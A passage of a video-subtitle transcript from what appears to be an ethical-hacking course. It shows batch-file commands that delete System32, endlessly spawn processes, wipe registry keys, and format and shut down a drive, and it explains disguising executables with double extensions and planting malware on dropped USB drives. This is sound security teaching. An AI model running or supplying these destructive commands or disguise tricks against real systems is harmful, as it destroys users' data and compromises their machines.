right and then paste it into notepad,\n\n154\n00:07:51.364 --> 00:07:55.288\nsave it as either a bat or\na command file, so .bat .cmd.\n\n155\n00:07:55.288 --> 00:08:01.300\nAnd then [COUGH] go ahead and run it,\nand/or call it through a script.\n\n156\n00:08:01.300 --> 00:08:03.280\nAnd then of course,\nyou're off to the races,\n\n157\n00:08:03.280 --> 00:08:06.480\nand watch your machine self\ndestruct in front of you.\n\n158\n00:08:06.480 --> 00:08:09.580\nSo that would be one way that somebody\ncould create some exploit code\n\n159\n00:08:09.580 --> 00:08:10.970\npotentially, and use it.\n\n160\n00:08:10.970 --> 00:08:15.430\nNow, these are overly simplistic examples,\nI made them simple on purpose, right?\n\n161\n00:08:15.430 --> 00:08:19.030\nWe're not trying to give away deep\ndark secrets here, number one.\n\n162\n00:08:19.030 --> 00:08:22.870\nAnd number two, remember, we're not\ntrying to show you how to go out and\n\n163\n00:08:22.870 --> 00:08:25.810\ntake this offensive knowledge and\nuse it against somebody.\n\n164\n00:08:25.810 --> 00:08:28.030\nWe're showing you the kind of\nthings that could be done and\n\n165\n00:08:28.030 --> 00:08:30.160\ngiving you ideas about\nhow they may happen.\n\n166\n00:08:30.160 --> 00:08:33.680\nThat's really the goal of this\nkind of interactive activity and\n\n167\n00:08:33.680 --> 00:08:36.990\nor some sort of environmental\nsolution we're showing you here.\n\n168\n00:08:36.990 --> 00:08:40.370\nSo, I know we have a few more stacked up,\nlet's go down on the next one.\n\n169\n00:08:40.370 --> 00:08:46.230\nSo, kinda create a virus that will\ndeactivate the operating system, right?\n\n170\n00:08:46.230 --> 00:08:50.845\nSo this can go in and if you see there\nagain, Notepad is kinda delivery vector\n\n171\n00:08:50.845 --> 00:08:53.760\nNotepad++, by the way,\nworks really well, as well.\n\n172\n00:08:53.760 --> 00:08:55.300\nIt's got the line numbering built in.\n\n173\n00:08:55.300 --> 00:08:59.520\nIt's kind of an IDE editor, so you can\ndo all sorts of debugging and stuff.\n\n174\n00:08:59.520 --> 00:09:02.730\nI use Notepad++ personally,\nas opposed to Notepad.\n\n175\n00:09:02.730 --> 00:09:03.690\nBut it's up to you.\n\n176\n00:09:03.690 --> 00:09:06.205\nNotepad++ is free,\nyou can download it if you'd like.\n\n177\n00:09:06.205 --> 00:09:07.135\nSo open it up and\n\n178\n00:09:07.135 --> 00:09:11.645\nthen del C:windows\\SYSTEM32\nas you can see there, right.\n\n179\n00:09:11.645 --> 00:09:16.575\nAnd then, you go in and\nyou can go through and delete all\n\n180\n00:09:16.575 --> 00:09:21.117\nthe other stuff that's in there as yeah,\njust yeah, kinda cleaning that up.\n\n181\n00:09:21.117 --> 00:09:26.827\nAnd then, when you're done, again, save it\nas a bat file or anything like that and\n\n182\n00:09:26.827 --> 00:09:31.993\nyou can go in and you're able to\nessentially nuke the operating system,\n\n183\n00:09:31.993 --> 00:09:35.523\nright, if you wanna go in and\npotentially take it out.\n\n184\n00:09:35.523 --> 00:09:39.153\nOne of the things on this one I'm\njust going to look at my copy of,\n\n185\n00:09:39.153 --> 00:09:41.963\nthere thank you, I was gonna say\nI can't see it from there easily,\n\n186\n00:09:41.963 --> 00:09:45.773\nI'm gonna just bring up my copy of notes\non my little machine here so I can see it.\n\n187\n00:09:45.773 --> 00:09:51.403\nBut one of the things to consider here,\nright, if you go in and\n\n188\n00:09:51.403 --> 00:09:56.760\nby the way, we're deleting\nboot video there, boot verify.\n\n189\n00:09:56.760 --> 00:10:01.650\nYou're deleting all the sub-directories\nthat go in and essentially, will\n\n190\n00:10:01.650 --> 00:10:05.400\nrender the machine inoperable and prevent\nit from activating and stuff like that.\n\n191\n00:10:05.400 --> 00:10:08.800\nSo, again, one of the things that's\ninteresting in Windows, though, a lot of\n\n192\n00:10:08.800 --> 00:10:13.110\nthese dlls now in the newer versions\nare part of the protected system class.\n\n193\n00:10:13.110 --> 00:10:16.465\nAnd so you're got the hidden driver\ncache that will restore these dlls if\n\n194\n00:10:16.465 --> 00:10:18.177\nthey're modified or compromised.\n\n195\n00:10:18.177 --> 00:10:21.932\nSo, this attack may not work depending\non the version of Windows that you're\n\n196\n00:10:21.932 --> 00:10:25.051\nrunning, because if you delete\nsome of these core system DLLs,\n\n197\n00:10:25.051 --> 00:10:26.475\nwe put them right back.\n\n198\n00:10:26.475 --> 00:10:29.425\nAnd essentially they come up at of\nthe driver of the hidden driver cache in\n\n199\n00:10:29.425 --> 00:10:30.105\nthe driver store.\n\n200\n00:10:30.105 --> 00:10:31.515\nSo, that may or may not work.\n\n201\n00:10:31.515 --> 00:10:33.175\nIt depends on the version of the OS,\nright?\n\n202\n00:10:33.175 --> 00:10:35.095\nBut there's still plenty\nof XP running out there.\n\n203\n00:10:35.095 --> 00:10:35.745\nSo,-\n&gt;&gt; There is.\n\n204\n00:10:35.745 --> 00:10:38.275\n&gt;&gt; We're gonna be able to do this for\nquite sometime.\n\n205\n00:10:38.275 --> 00:10:41.910\nAll right, so, another one, if you wanna\nhave just an endless number of Notepads\n\n206\n00:10:41.910 --> 00:10:45.400\npopping up to essentially just\nbomb somebody into submission\n\n207\n00:10:45.400 --> 00:10:48.390\nthrough resource based denial\nof service attack here, right,\n\n208\n00:10:48.390 --> 00:10:50.530\nuntil the machine just rolls over and\ndies.\n\n209\n00:10:50.530 --> 00:10:55.645\nSo you could see there Start system root,\nsystem32 notepad.\n\n210\n00:10:55.645 --> 00:10:57.745\nGo to top and just loop it, right?\n\n211\n00:10:57.745 --> 00:11:01.055\nAnd it just executes\nessentially continuously.\n\n212\n00:11:01.055 --> 00:11:05.310\nThere's no stop there and\nif that goes and gets fired off,\n\n213\n00:11:05.310 --> 00:11:08.590\nthat's gonna actually, potentially,\nsuck the life out of the system.\n\n214\n00:11:08.590 --> 00:11:10.530\nBy the way,\nyou can do that with any program.\n\n215\n00:11:10.530 --> 00:11:14.290\nNotepad is an easy one but you could do it\nwith Win Word if you wanna launch Word,\n\n216\n00:11:14.290 --> 00:11:16.720\nwhich is a little bit\nmore resource intensive.\n\n217\n00:11:16.720 --> 00:11:20.160\nIf you know for a fact there's a certain\nkind of program on the system, yeah,\n\n218\n00:11:20.160 --> 00:11:23.820\nyou can go after that one if it's gonna\nhave a huge resource spike as it draws\n\n219\n00:11:23.820 --> 00:11:25.570\ninitially and opens up.\n\n220\n00:11:25.570 --> 00:11:26.200\nThose kinda things.\n\n221\n00:11:26.200 --> 00:11:28.660\nYou can put any executable in there in\nother words, that you would want and\n\n222\n00:11:28.660 --> 00:11:29.990\nany of them will work.\n\n223\n00:11:29.990 --> 00:11:32.930\nAgain, this is just an iterative\nloop that will just execute to\n\n224\n00:11:32.930 --> 00:11:35.020\ninfinity until the system dies, right.\n\n225\n00:11:35.020 --> 00:11:38.460\nGood news is when that system restarts,\nthat code goes away cuz it's resident in\n\n226\n00:11:38.460 --> 00:11:42.230\nmemory, so it obviously only effects\nthe system for that particular duration.\n\n227\n00:11:42.230 --> 00:11:44.290\nWhat's the next one we got up there?\n\n228\n00:11:44.290 --> 00:11:47.400\nWe've got, yeah,\nthis is one of my personal favorites.\n\n229\n00:11:47.400 --> 00:11:48.955\nDeletes some of the registry keys, right?\n\n230\n00:11:48.955 --> 00:11:50.283\n&gt;&gt; [LAUGH]\n&gt;&gt; So go in and\n\n231\n00:11:50.283 --> 00:11:53.849\nyou're starting the reg editor.\n\n232\n00:11:53.849 --> 00:11:57.969\nYou're going in deleting\nout any of the keys, right.\n\n233\n00:11:57.969 --> 00:12:01.005\nAnd then, we're nice enough to write\na little message there your computer has\n\n234\n00:12:01.005 --> 00:12:03.090\nbeen destroyed have a nice day.\n\n235\n00:12:03.090 --> 00:12:04.460\nThen off you go.\n\n236\n00:12:04.460 --> 00:12:05.037\nNow again,\n\n237\n00:12:05.037 --> 00:12:08.627\nyou could substitute the various keys\nwe did HKEY what did I do there HKEY.\n\n238\n00:12:08.627 --> 00:12:10.132\n&gt;&gt; CR?\n\n239\n00:12:10.132 --> 00:12:12.953\n&gt;&gt; So we would do HKEY local machine,\nyou would go in and\n\n240\n00:12:12.953 --> 00:12:15.519\ndelete any of the system\nones that you want I just\n\n241\n00:12:15.519 --> 00:12:18.850\nput a place holder in there for\nwhatever we'd wanna do.\n\n242\n00:12:18.850 --> 00:12:20.500\nBut you can obviously go in and\n\n243\n00:12:20.500 --> 00:12:23.640\nwhack any part of the registry by\ndoing something like that, right.\n\n244\n00:12:23.640 --> 00:12:25.310\nSo just keep that in mind.\n\n245\n00:12:25.310 --> 00:12:29.580\nAnd then you would go in and the blue\nscreen of death, the dreaded BSOD.\n\n246\n00:12:29.580 --> 00:12:34.695\nNot to be confused with the purple screen\nor the fuchsia screen of death in VMware,\n\n247\n00:12:34.695 --> 00:12:38.370\nit's the FSOD, right,\nthat we kinda have pinkish purplish there.\n\n248\n00:12:38.370 --> 00:12:40.540\nSo, there you could see we go in, right.\n\n249\n00:12:40.540 --> 00:12:41.977\nDelete system drive, right.\n\n250\n00:12:41.977 --> 00:12:44.346\nAll sub directories, right.\n\n251\n00:12:44.346 --> 00:12:47.600\nFormat and then shutdown afterwards.\n\n252\n00:12:47.600 --> 00:12:50.040\nSo essentially whack the system and\nshut it down.\n\n253\n00:12:50.040 --> 00:12:53.861\nThat will render your system\ntotally inoperable for you.\n\n254\n00:12:53.861 --> 00:12:56.859\nSo all sorts of exploit code that\nwe could potentially go in and\n\n255\n00:12:56.859 --> 00:12:58.440\nplay with as you can see.\n\n256\n00:12:58.440 --> 00:12:59.280\nPretty straight forward.\n\n257\n00:12:59.280 --> 00:13:00.100\nPretty simple.\n\n258\n00:13:00.100 --> 00:13:01.700\nPretty easy as they say.\n\n259\n00:13:01.700 --> 00:13:05.590\nAnd at no point to my hands ever leave\nmy body during the demonstration.\n\n260\n00:13:05.590 --> 00:13:08.912\nAt all times they are connected\nbecause as I said Mike was driving.\n\n261\n00:13:08.912 --> 00:13:11.880\nAll right, so yeah, let's take a look\nat a slightly different approach.\n\n262\n00:13:11.880 --> 00:13:14.130\nWe've shown you how to write\nsome code potentially.\n\n263\n00:13:14.130 --> 00:13:15.960\nWe've shown you how to submit a sample.\n\n264\n00:13:15.960 --> 00:13:18.170\nIf there was a virus,\npotentially, that you had found.\n\n265\n00:13:18.170 --> 00:13:21.210\nMaybe during an incident response or\nforensic examination.\n\n266\n00:13:21.210 --> 00:13:22.796\nLittle unclear about what is was.\n\n267\n00:13:22.796 --> 00:13:24.320\nWanna get an expert opinion.\n\n268\n00:13:24.320 --> 00:13:27.530\nYou could always email Mike@itpro.tv,\nas well.\n\n269\n00:13:27.530 --> 00:13:29.179\nAll virus submission samples.\n\n270\n00:13:29.179 --> 00:13:30.907\nHe will be glad to get back to you.\n&gt;&gt; Just attach them and send them on.\n\n271\n00:13:30.907 --> 00:13:31.741\n&gt;&gt; Attach them and send them.\n\n272\n00:13:31.741 --> 00:13:35.035\nWithin 24 hours, if you don't hear from\nhim, it was a virus, just to be clear.\n\n273\n00:13:35.035 --> 00:13:37.960\n&gt;&gt; [LAUGH]\n&gt;&gt; So, do not do that, by the way.\n\n274\n00:13:37.960 --> 00:13:38.871\nOnly kidding, right?\n\n275\n00:13:38.871 --> 00:13:39.993\nDon't wanna do that.\n\n276\n00:13:39.993 --> 00:13:43.324\nAll right, what we're gonna do is we're\ngonna take a look at the lab environment,\n\n277\n00:13:43.324 --> 00:13:44.430\nas we often try to do.\n\n278\n00:13:44.430 --> 00:13:47.260\nTake in and\ndo a little interactive show and tell.\n\n279\n00:13:47.260 --> 00:13:51.620\nWhat I'm gonna do is load up\na virus disassembly program.\n\n280\n00:13:51.620 --> 00:13:55.360\nWe're gonna take a look at just how to\ntake any executable, tear it apart,\n\n281\n00:13:55.360 --> 00:13:57.170\npotentially look for warning signs and\n\n282\n00:13:57.170 --> 00:13:59.770\nthings in there, and show you what\nyou may be able to do with that.\n\n283\n00:13:59.770 --> 00:14:02.480\nSo if we can go to,\nthere we go, look at that.\n\n284\n00:14:02.480 --> 00:14:03.380\nIt's amazing.\n\n285\n00:14:03.380 --> 00:14:04.595\nVoice control at its finest.\n\n286\n00:14:04.595 --> 00:14:07.220\n&gt;&gt; [LAUGH]\n&gt;&gt; All right, so we're gonna go in, and\n\n287\n00:14:07.220 --> 00:14:10.810\nin the lab environment, as you can see,\nI've already loaded up the software.\n\n288\n00:14:10.810 --> 00:14:12.190\nLet me just bring it up here.\n\n289\n00:14:12.190 --> 00:14:15.970\nSo we've got IDA,\nwhich is the software that we're using.\n\n290\n00:14:15.970 --> 00:14:17.320\nAnd we're just gonna go in.\n\n291\n00:14:17.320 --> 00:14:23.200\nGo to open this up, and we're just\ngonna go grab a piece of software.\n\n292\n00:14:23.200 --> 00:14:27.660\nSo just gonna go in and go to the C drive.\n\n293\n00:14:27.660 --> 00:14:32.400\nAnd in the C drive, whoops,\nthat's not the one.\n\n294\n00:14:32.400 --> 00:14:33.152\nWe'll go in there.\n\n295\n00:14:33.152 --> 00:14:35.180\nLet me just scroll down.\n\n296\n00:14:35.180 --> 00:14:39.600\nAnd we'll go to lab files, and\nin lab files, we'll go in.\n\n297\n00:14:39.600 --> 00:14:43.120\nGo to stag detect, and\nwe'll take the executable there.\n\n298\n00:14:43.120 --> 00:14:44.790\nJust one of the executables.\n\n299\n00:14:44.790 --> 00:14:48.270\nStegdetect is a stegonography\nprogram that allows us to find\n\n300\n00:14:48.270 --> 00:14:50.910\nstegographically modified files.\n\n301\n00:14:50.910 --> 00:14:54.300\nSo it allows us to hide files,\nright, using stegonography.\n\n302\n00:14:54.300 --> 00:14:56.090\nWe're just going to\ndisassemble the executable.\n\n303\n00:14:56.090 --> 00:14:56.938\nThat's all we're doing.\n\n304\n00:14:56.938 --> 00:14:58.979\nSo we're gonna grab it,\nwe're gonna bring it in here.\n\n305\n00:15:00.210 --> 00:15:05.390\nWe're gonna go in, and once we load that,\nwhat we're then gonna do is just keep\n\n306\n00:15:05.390 --> 00:15:09.600\nthe defaults, and you could see there,\nwe're going to essentially go in, and\n\n307\n00:15:09.600 --> 00:15:14.500\nwe are going to look at this information,\nwe're going to click open, right?\n\n308\n00:15:14.500 --> 00:15:17.080\nIt's gonna load up for\nus, just give it a second.\n\n309\n00:15:17.080 --> 00:15:21.770\nAnd then, we're gonna see the information\nin the file, let me just scroll up so\n\n310\n00:15:21.770 --> 00:15:23.660\nyou can kind of see this a little better.\n\n311\n00:15:23.660 --> 00:15:27.710\nWe're then gonna be able to go in, we've\ngot the IDA view, we've got hex view,\n\n312\n00:15:27.710 --> 00:15:31.730\nwe've got structures, we've got all sorts\nof different stuff that we can look at,\n\n313\n00:15:31.730 --> 00:15:35.540\ndifferent ways in other words of\nseeing the information in here.\n\n314\n00:15:35.540 --> 00:15:39.370\nAnd what we then would do typically\nis look at the decompiling or\n\n315\n00:15:39.370 --> 00:15:40.980\ndeconstruction of this.\n\n316\n00:15:40.980 --> 00:15:44.915\nSo if we go into view,\nwe can go in, we can go to graphs,\n\n317\n00:15:44.915 --> 00:15:47.748\nright over here, and just highlight.\n\n318\n00:15:47.748 --> 00:15:51.153\nAnd we've got different ways of\nlooking at this information.\n\n319\n00:15:51.153 --> 00:15:52.547\nI'm gonna click Flowchart.\n\n320\n00:15:52.547 --> 00:15:56.167\nWe'll just grab this and\nkinda bring this up here.\n\n321\n00:15:56.167 --> 00:15:58.410\nLet me click to just set that.\n\n322\n00:15:58.410 --> 00:16:00.270\nThere, oops there we go.\n\n323\n00:16:00.270 --> 00:16:01.010\nYeah there we go all right.\n\n324\n00:16:01.010 --> 00:16:04.780\nSo gotta remember to let go when I\ntake that file and move it around.\n\n325\n00:16:04.780 --> 00:16:09.590\nSo what we're seeing now is essentially\na graphical flow of the software and\n\n326\n00:16:09.590 --> 00:16:11.660\nhow it executes and how it works.\n\n327\n00:16:11.660 --> 00:16:15.970\nAnd so we're seeing the logic path,\nessentially, that is in the software.\n\n328\n00:16:15.970 --> 00:16:17.530\nAnd we're able to go up.\n\n329\n00:16:17.530 --> 00:16:22.620\nLet me just scroll up here.\n\n330\n00:16:22.620 --> 00:16:25.000\nYou can see at the top of the file.\n\n331\n00:16:25.000 --> 00:16:30.190\nAnd we're able to look at the information.\n\n332\n00:16:32.580 --> 00:16:41.167\nThat allows me to be\nable to see There we go.\n\n333\n00:16:41.167 --> 00:16:45.626\nAllows me to be able to see just how\nthe flow of the software behaves,\n\n334\n00:16:45.626 --> 00:16:47.582\nlooking for telltale signs or\n\n335\n00:16:47.582 --> 00:16:52.650\nthings that may be unusual in the\nexecution of the start of the software.\n\n336\n00:16:52.650 --> 00:16:53.370\nWe can also go in,\n\n337\n00:16:53.370 --> 00:16:56.014\nand there's many different ways\nto essentially envision this.\n\n338\n00:16:56.014 --> 00:16:59.346\nWe can go in and once we look at\nthe start, we can also go in and\n\n339\n00:16:59.346 --> 00:17:02.371\nlook at all the functions and\nsee the function calls.\n\n340\n00:17:02.371 --> 00:17:07.312\nAnd so if we go into view here and\nagain, let me just go into graphs and\n\n341\n00:17:07.312 --> 00:17:10.280\nwe'll go in and look at function calls.\n\n342\n00:17:10.280 --> 00:17:15.553\nWe can see now this one is\na little bit different.\n\n343\n00:17:15.553 --> 00:17:17.870\nYou can see it looks kinda crazy.\n\n344\n00:17:17.870 --> 00:17:20.610\nWhat we ultimately have to do,\nbecause it's all compressed and\n\n345\n00:17:20.610 --> 00:17:25.140\nit's zoomed out very wide,\nI have to go and zoom in.\n\n346\n00:17:25.140 --> 00:17:29.930\nAnd so what we're going to do is set\nthe zoom in here, so I'm gonna go to zoom.\n\n347\n00:17:31.570 --> 00:17:36.790\nAnd I'm gonna go to zoom in,\nand as I zoom in, you\n\n348\n00:17:36.790 --> 00:17:43.270\ncan begin to see this essentially becoming\na little bit, a little too much there.\n\n349\n00:17:43.270 --> 00:17:44.971\nEssentially becoming\na little bit easier to see.\n\n350\n00:17:44.971 --> 00:17:49.601\nAnd so I'm able to start breaking\ndown all the functions in\n\n351\n00:17:49.601 --> 00:17:53.958\nthe environment, and\nI'm able to actually see them.\n\n352\n00:17:53.958 --> 00:17:55.288\nAnd I'm able to interact with them.\n\n353\n00:17:55.288 --> 00:17:59.997\nLet me just drag this around so we can\nkinda see where they're all heading to,\n\n354\n00:17:59.997 --> 00:18:00.510\nright?\n\n355\n00:18:00.510 --> 00:18:05.790\nSo as we start coming over here we'll see\nsome of the central parts of the software,\n\n356\n00:18:05.790 --> 00:18:09.620\nand we can begin to see how things\nare related to one another, and\n\n357\n00:18:09.620 --> 00:18:13.440\nwe can see how things connect.\n\n358\n00:18:13.440 --> 00:18:17.850\nAnd we can see, as I just continue\nscrolling over, looking at the various\n\n359\n00:18:17.850 --> 00:18:21.740\nbuilding blocks in the code, I can see all\nof the different areas and I can see all\n\n360\n00:18:24.890 --> 00:18:26.930\nthe different pieces of information.\n\n361\n00:18:26.930 --> 00:18:29.360\nAnd again,\nas we do with forensic analysis,\n\n362\n00:18:29.360 --> 00:18:34.020\nif this is what we specialize in,\nwe would be looking at this information,\n\n363\n00:18:34.020 --> 00:18:39.550\ntearing it apart and\ntrying to figure out what is in there.\n\n364\n00:18:39.550 --> 00:18:42.870\nIs there any code,\nare there any unusual functions,\n\n365\n00:18:42.870 --> 00:18:47.530\nis there anything in the actual system\nitself that would be problematic?\n\n366\n00:18:47.530 --> 00:18:48.420\nAnd we can go through and\n\n367\n00:18:48.420 --> 00:18:52.880\nlook, literally line by line, item by\nitem, command by command at the code.\n\n368\n00:18:52.880 --> 00:18:56.424\nWe can go in and look at the hex and\nactually take apart the executable,\n\n369\n00:18:56.424 --> 00:18:59.728\ndecompiling it, looking at it,\nsee the hex code, and sometimes\n\n370\n00:18:59.728 --> 00:19:03.815\nthere may be information buried in the hex\ncode that tells us who wrote the codes,\n\n371\n00:19:03.815 --> 00:19:07.693\nwe may see the signature of the writer,\nwhether it's a virus writer or not.\n\n372\n00:19:07.693 --> 00:19:11.793\nA lot of times bad actors will tag their\nsoftware so we'll be able to find evidence\n\n373\n00:19:11.793 --> 00:19:15.071\nof that, we'll be able to see that,\nwe can go in and take a look.\n\n374\n00:19:15.071 --> 00:19:21.101\nWe can go breakdown looking at\nthe information that's coming in and\n\n375\n00:19:21.101 --> 00:19:25.227\nlook at all the individual\ncomponent parts and\n\n376\n00:19:25.227 --> 00:19:29.456\nlook at all of these items and\nliterally go in and\n\n377\n00:19:29.456 --> 00:19:34.459\njust examine them and\nsee what's happening with them.\n\n378\n00:19:34.459 --> 00:19:37.760\nAnd so a program like this, and there are\nmany like this, can be used in a variety\n\n379\n00:19:37.760 --> 00:19:40.842\nof ways, but typically what we use it for\nis to actually examine the code.\n\n380\n00:19:40.842 --> 00:19:44.676\nBecause what happens, if you think about\nit, when we're looking at a piece of virus\n\n381\n00:19:44.676 --> 00:19:46.731\ncode, or any code of any kind,\nvirus or not.\n\n382\n00:19:46.731 --> 00:19:50.454\nBut an executable or an MSI,\nor anything that's packaged,\n\n383\n00:19:50.454 --> 00:19:52.790\nis we don't see what's inside of it.\n\n384\n00:19:52.790 --> 00:19:53.910\nWhat we see is the wrapper.\n\n385\n00:19:53.910 --> 00:19:57.420\nRight?\nWe see the outer shell, something.exe.\n\n386\n00:19:57.420 --> 00:19:58.170\nAnd that's fine.\n\n387\n00:19:58.170 --> 00:20:03.409\nBut the problem is,\nwe don't really know what that is.\n\n388\n00:20:03.409 --> 00:20:04.813\nAnd this software allows\nus to look under the hood.\n\n389\n00:20:04.813 --> 00:20:06.767\nNow another interesting thing\nthat goes on in Windows,\n\n390\n00:20:06.767 --> 00:20:08.274\nlet's just think about this for a second.\n\n391\n00:20:08.274 --> 00:20:11.630\nSo I'm just gonna click on\nthe Windows Explorer for a minute.\n\n392\n00:20:11.630 --> 00:20:15.576\nThis is a Windows 7 box, by the way,\njust so you know what we're looking at.\n\n393\n00:20:15.576 --> 00:20:21.160\nAnd so in here,\nI'm gonna go back to my lab files and\n\n394\n00:20:21.160 --> 00:20:26.820\njust look for an executable.\n\n395\n00:20:26.820 --> 00:20:30.050\nSo let's go in and\nlet's do stegdetect for instance.\n\n396\n00:20:30.050 --> 00:20:36.331\nNow when I take something like this and\nI right click, let me just do that and\n\n397\n00:20:36.331 --> 00:20:44.638\nsee if we can Get that to cooperate.\n\n398\n00:20:44.638 --> 00:20:45.780\nOne second.\n\n399\n00:20:45.780 --> 00:20:46.730\nThere's my rename.\n\n400\n00:20:46.730 --> 00:20:54.616\nI wanna be able to I'll do that.\n\n401\n00:20:54.616 --> 00:20:55.937\n[CROSSTALK].\n\n402\n00:20:55.937 --> 00:20:57.925\nJust let me close that.\n\n403\n00:20:57.925 --> 00:20:59.155\nNo, that's not going to work either.\n\n404\n00:20:59.155 --> 00:21:05.018\nAll right, so\nwhat I wanted to try show you quickly.\n\n405\n00:21:05.018 --> 00:21:06.788\nJust having trouble with\nthe right click on the mouse.\n\n406\n00:21:06.788 --> 00:21:12.113\nWe, I think, have a slightly defective\nversion of a old-school technology here.\n\n407\n00:21:12.113 --> 00:21:14.853\nSo I'll just narrate.\n\n408\n00:21:14.853 --> 00:21:16.858\nNo big deal.\nI'm just going to show you something kind\n\n409\n00:21:16.858 --> 00:21:18.993\nof interesting,\nwhich is we can right click on a file, and\n\n410\n00:21:18.993 --> 00:21:21.669\nyou guys probably know this because\nyou've probably done this before.\n\n411\n00:21:21.669 --> 00:21:23.640\nYou can rename a file window.\n\n412\n00:21:23.640 --> 00:21:25.680\nThis is not anything that's new.\n\n413\n00:21:25.680 --> 00:21:28.500\nWhen you right click and rename it,\nlet's say we took that executable.\n\n414\n00:21:28.500 --> 00:21:34.650\nAnd instead of it being stagdetect.exe,\nwe named it stagdetect.docx.exe.\n\n415\n00:21:34.650 --> 00:21:37.060\nIt would change and\nlook like it was a Word document.\n\n416\n00:21:37.060 --> 00:21:37.580\nRight?\n\n417\n00:21:37.580 --> 00:21:40.360\nBut when you went to run it,\nit would actually execute the program.\n\n418\n00:21:40.360 --> 00:21:42.440\nNow it's a very simplistic trick, but\n\n419\n00:21:42.440 --> 00:21:44.940\nthis issue is you wouldn't\nknow it was an executable, and\n\n420\n00:21:44.940 --> 00:21:49.040\nbecause what Windows does is it only shows\nyou the beginning of that string, so\n\n421\n00:21:49.040 --> 00:21:52.840\nit's going to show you stegdetect.docx,\nshow it to you as an icon,\n\n422\n00:21:52.840 --> 00:21:55.860\nas a Word document,\nnot show you the executable portion.\n\n423\n00:21:55.860 --> 00:21:57.730\nIt hides that extension.\n\n424\n00:21:57.730 --> 00:22:01.590\nAnd somebody unknowingly may click on\nthat, and as a result, potentially\n\n425\n00:22:01.590 --> 00:22:05.788\ninfect themselves with whatever stegdetect\nis, if it's malware or something.\n\n426\n00:22:05.788 --> 00:22:09.810\nSo yeah, there's lots of ways for us to\nsecret that software, secret that malware\n\n427\n00:22:09.810 --> 00:22:13.340\ninto a system, tricking people to click\non it without their knowledge and\n\n428\n00:22:13.340 --> 00:22:16.770\nwithout them understanding it's happening,\nWe just have to be creative, right,\n\n429\n00:22:16.770 --> 00:22:18.410\nas ethical hackers to figure that out.\n\n430\n00:22:18.410 --> 00:22:20.880\nSo we want to know that there's\nmany different ways for\n\n431\n00:22:20.880 --> 00:22:24.100\nthis to take place and we just have to\nthink about that and be aware of that\n\n432\n00:22:24.100 --> 00:22:27.620\nbecause obviously this can be a problem\nif we're not paying attention.\n\n433\n00:22:27.620 --> 00:22:33.450\nIf we used a baiting attack where\nwe left media laying around.\n\n434\n00:22:33.450 --> 00:22:35.540\nSo USB thumb drives.\n\n435\n00:22:35.540 --> 00:22:37.230\nIt's amazing what people will pick up.\n\n436\n00:22:37.230 --> 00:22:38.606\n&gt;&gt; It's a really easy one to do isn't it?\n\n437\n00:22:38.606 --> 00:22:40.027\n&gt;&gt; It is.\n\n438\n00:22:40.027 --> 00:22:42.236\n&gt;&gt; It's surprising how many people\nwill pick up unknown media and\n\n439\n00:22:42.236 --> 00:22:43.579\ntake it right in to the work computer.\n\n440\n00:22:43.579 --> 00:22:44.153\n&gt;&gt; And unknown people.\n\n441\n00:22:44.153 --> 00:22:44.880\n&gt;&gt; But that's a whole other story.\n\n442\n00:22:44.880 --> 00:22:49.151\nIt's amazing if you put a little logo\non something, people will pick it up,\n\n443\n00:22:49.151 --> 00:22:53.044\ntake it inside, plug it in their\ncomputer and say yeah, I want that.\n\n444\n00:22:53.044 --> 00:22:53.764\nI have to have that.\n\n445\n00:22:53.764 --> 00:22:56.534\nAnd so we call it a baiting attack.\n\n446\n00:22:56.534 --> 00:22:59.070\nYou leave them scattered around\nout in the common areas.\n\n447\n00:22:59.070 --> 00:23:00.620\nWe do this when we pen test all the time.\n\n448\n00:23:00.620 --> 00:23:04.730\nAnd you know the reality is we expect\na certain percentage of people\n\n449\n00:23:04.730 --> 00:23:06.470\nwill pick those things up and\ngo inside and\n\n450\n00:23:06.470 --> 00:23:08.960\nobviously then we can hopefully\nlaunch malwares as a result.\n\n451\n00:23:08.960 --> 00:23:12.880\nWe'll typically put malware on there\nduring a pen test that has been\n\n452\n00:23:12.880 --> 00:23:15.780\nrebranded this way where you\ndon't see the dual extension.\n\n453\n00:23:15.780 --> 00:23:18.787\nYou only see the first one, so it looks\nlike a Word document or something and\n\n454\n00:23:18.787 --> 00:23:19.570\nthey'll load it.\n\n455\n00:23:19.570 --> 00:23:21.280\nAnd that didn't work,\nwhat's going on with that?\n\n456\n00:23:21.280 --> 00:23:24.342\nAnd all of a sudden we've now\nessentially taken over the system.\n\n457\n00:23:24.342 --> 00:23:28.120\nAnd so this is something you also have to\nbe aware of because this is the kind of\n\n458\n00:23:28.120 --> 00:23:29.017\nstuff that we do.\n\n459\n00:23:29.017 --> 00:23:32.899\nWhen I do pen tests or when we do them in\ngeneral, red team, tiger team, blue team,\n\n460\n00:23:32.899 --> 00:23:34.840\nred team exercises, that kind of stuff,\n\n461\n00:23:34.840 --> 00:23:36.959\nthis is one of the things\nthat we actually do.\n\n462\n00:23:36.959 --> 00:23:38.900\nOr we will leave them, for inside,\n\n463\n00:23:38.900 --> 00:23:42.334\nif we're doing an invasive test\nwhere we actually break-in or\n\n464\n00:23:42.334 --> 00:23:46.121\ngain access physically,\nas opposed to just breaking in logically.\n\n465\n00:23:46.121 --> 00:23:48.098\nRight?\nI have talked a lot about being on\n\n466\n00:23:48.098 --> 00:23:51.120\nthe cleaning crew is a great\nway to infiltrate a system.\n\n467\n00:23:51.120 --> 00:23:55.120\nYou're getting in there, we'll just leave\nthumb drives scattered on people's desks.\n\n468\n00:23:55.120 --> 00:23:55.840\nIt's amazing.\n\n469\n00:23:55.840 --> 00:23:58.440\nPeople come all yeah I need that,\nthey don't realize what it is, right?\n\n470\n00:23:58.440 --> 00:24:00.150\nThey'll pick it up and they'll use it.\n\n471\n00:24:00.150 --> 00:24:02.540\nSo there is all sorts of ways for\nus to do this.\n\n472\n00:24:02.540 --> 00:24:04.140\nIt's not hard at all.\n\n473\n00:24:04.140 --> 00:24:06.635\nRight, so be aware of the thumb drive,\nis what we often tell people.\n\n474\n00:24:06.635 --> 00:24:08.620\n&gt;&gt; [LAUGH]\n&gt;&gt; Because years ago,\n\n475\n00:24:08.620 --> 00:24:10.470\nyou used to be able to do\nthis with floppy disks.\n\n476\n00:24:10.470 --> 00:24:12.670\nBut I mean,\npeople don't use floppies anymore.\n\n477\n00:24:12.670 --> 00:24:14.810\nBut you used to be able to\njust infect floppies, and\n\n478\n00:24:14.810 --> 00:24:16.130\nthen just scatter them around.\n\n479\n00:24:16.130 --> 00:24:17.490\nPeople would pick them up and use them.\n\n480\n00:24:17.490 --> 00:24:20.550\nAnd you would just very easily\nbe able to infect systems.\n\n481\n00:24:20.550 --> 00:24:22.710\nKinda skipped the whole CD-Rom 